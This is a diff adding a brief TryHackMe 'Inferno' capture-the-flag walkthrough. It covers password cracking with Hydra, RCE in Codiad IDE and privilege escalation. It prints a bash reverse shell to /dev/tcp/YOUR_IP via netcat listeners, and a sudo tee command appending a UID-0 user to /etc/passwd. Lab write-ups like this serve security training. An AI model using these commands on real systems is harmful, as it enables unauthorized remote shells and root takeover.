@@ -1,0 +1,36 @@
+Inferno - TryHackMe Writeup
+ip=10.48.172.147
+1. Enumeration
+Start with an Nmap scan to identify open ports:
+
+Port 80: HTTP (Apache)
+
+Port 22: SSH
+
+Directory brute-forcing reveals a /inferno directory which requires HTTP Basic Authentication. Use Hydra with a common wordlist to crack the credentials for the web login.
+
+2. Initial Access (The "Double NC" Trick)
+Inside the web panel, we find Codiad IDE. This version is vulnerable to Remote Code Execution (RCE).
+
+To stabilize the shell and prevent it from dying instantly, use two Netcat listeners:
+
+Terminal 1 (The Trap):
+echo 'bash -i >& /dev/tcp/YOUR_IP/9002 0>&1' | nc -lvnp 9001
+
+Terminal 2 (The Real Shell):
+nc -lvnp 9002
+
+Run the Python exploit pointing to port 9001. The exploit hits 9001, which immediately triggers a permanent shell on 9002.
+
+3. Horizontal Privilege Escalation
+Once inside as www-data, look for hidden files. There is a file containing hex-encoded strings. Decode the hex to find the password for the user dante. Switch user:
+su dante
+
+4. Vertical Privilege Escalation (Root)
+Check sudo permissions:
+sudo -l
+
+The user can run /usr/bin/tee as root without a password. Use this to append a new root user to /etc/passwd:
+echo "newroot:[PASSWORD_HASH]:0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
+
+Switch to your new user to grab the root flag.
